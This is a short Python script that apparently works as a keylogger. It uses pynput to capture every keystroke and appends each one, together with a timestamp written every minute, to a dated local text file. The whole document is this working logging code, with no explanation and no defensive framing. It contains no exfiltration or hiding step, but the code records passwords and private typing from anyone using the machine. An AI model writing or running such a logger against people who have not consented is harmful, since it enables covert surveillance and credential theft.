# file = open('keys_19-06-2025-02.21.13.txt')
# print(file.read(100000))
import threading
from pynput.keyboard import Listener
from datetime import datetime
import time
now = datetime.now().strftime("%d-%m-%Y-%H.%M.%S")
filename = ('keys_' + now + '.txt')
def timestemp_everyminute():
    while True:
      timestemp = datetime.now().strftime("%d/%m/%Y-%H:%M:%S")
      with open(filename, "a", encoding="utf-8") as file:
        file.write(f'~\n{timestemp}:~\n\n')
      time.sleep(60)
def on_press(key):
     # while Listener.running:
    if hasattr(key, 'char') and key.char is not None:
        text_key = (key.char)
    else:
        text_key = (key)
    with open(filename, "a", encoding="utf-8") as file:
        file.write(f'{text_key}\n')
        file.flush()
Thread_timestemp_everyminute = threading.Thread(target=timestemp_everyminute, daemon=True)
Thread_timestemp_everyminute.start()
with Listener(on_press=on_press) as listener:
    listener.join()
